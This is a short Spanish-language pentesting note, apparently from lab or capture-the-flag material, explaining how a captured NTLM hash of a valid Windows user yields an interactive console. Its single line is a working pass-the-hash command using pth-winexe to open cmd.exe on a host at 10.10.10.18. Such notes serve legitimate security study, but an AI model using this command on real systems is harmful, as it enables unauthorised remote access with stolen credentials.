Una vez obtenido un hash de un usuario válido en un sistema Windows, podemos hacer uso de este hash para obtener una consola interactiva.
`pth-winexe -U WORKGROUP/Administrators%<hash_NTLM> //10.10.10.18 cmd.exe`
